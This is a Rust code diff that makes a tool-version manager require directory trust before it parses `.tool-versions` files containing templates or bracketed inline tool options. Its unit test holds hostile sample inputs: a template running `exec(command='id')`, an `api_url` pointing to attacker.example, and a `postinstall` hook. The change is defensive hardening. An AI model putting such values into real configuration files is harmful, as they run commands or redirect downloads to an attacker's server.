@@ -64,7 +64,7 @@ impl ToolVersions {
 
     pub(crate) fn path_requires_trust(path: &Path) -> bool {
         match file::read_to_string(path) {
-            Ok(body) => contains_template_syntax(file::strip_utf8_bom(&body)),
+            Ok(body) => body_requires_trust(file::strip_utf8_bom(&body)),
             Err(_) => true,
         }
     }
@@ -72,8 +72,10 @@ impl ToolVersions {
     pub(crate) fn parse_str(s: &str, path: PathBuf) -> Result<Self> {
         let mut cf = Self::init(&path);
         let dir = path.parent();
-        let s = if contains_template_syntax(s) {
+        if body_requires_trust(s) {
             trust_check(&path)?;
+        }
+        let s = if contains_template_syntax(s) {
             let mut tera = get_tera(dir);
             render_str(&mut tera, s, &cf.context)?
         } else {
@@ -249,9 +251,37 @@ impl Clone for ToolVersions {
     }
 }
 
+/// Whether a `.tool-versions` body needs trust before it is parsed.
+///
+/// Templates can run commands, and tool options written inline in the tool name
+/// (`tool[opt=value]`) can run code (`postinstall`) or redirect requests
+/// (`api_url`), so either one makes the file unsafe to load from an untrusted
+/// directory. Plain `tool version` lines stay trust-free.
+fn body_requires_trust(body: &str) -> bool {
+    contains_template_syntax(body)
+        || body.lines().any(|line| {
+            let line = line.split_once('#').map_or(line, |(line, _)| line);
+            line.split_whitespace()
+                .next()
+                .is_some_and(|tool| tool.contains('['))
+        })
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn inline_tool_options_require_trust() {
+        assert!(!body_requires_trust(""));
+        assert!(!body_requires_trust("node 20.0.0\npython 3.12 3.11\n"));
+        assert!(!body_requires_trust("# a [comment]\nnode 20.0.0 # [x]\n"));
+        assert!(body_requires_trust("{{ exec(command='id') }}node 20\n"));
+        assert!(body_requires_trust(
+            "github:sharkdp/fd[api_url=http://attacker.example/api/v3] latest\n"
+        ));
+        assert!(body_requires_trust("node 20\n  node[postinstall=id] 20\n"));
+    }
 
     /// `dump` relies on `post` to terminate each line, and `trim_end` only ever
     /// fixes up the last one. A tool that is not already present in the file is
